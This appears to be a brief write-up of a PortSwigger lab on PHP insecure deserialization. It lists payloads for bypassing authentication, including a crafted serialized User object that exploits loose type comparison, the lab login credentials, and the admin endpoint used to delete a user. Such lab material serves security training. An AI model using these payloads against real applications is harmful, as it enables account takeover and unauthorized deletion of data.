## Modifying serialized data types

**Category:** deserialization
**Difficulty:** Unknown

### Description
This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access theadministratoraccount. Then, delete the usercarlos.

### Solution Steps
To access another user's account, you will need to exploit a quirk in how PHP compares data of different types.
Note that PHP's comparison behavior differs between versions. This lab assumes behavior consistent with PHP 7.x and earlier.

### Key Payloads
- `administrator`
- `carlos`
- `wiener:peter`
- `GET /my-account`
- `username`
- `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`
- `/admin`
- `/admin/delete?username=carlos`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: deserialization

---
*Source: PortSwigger Web Security Academy*
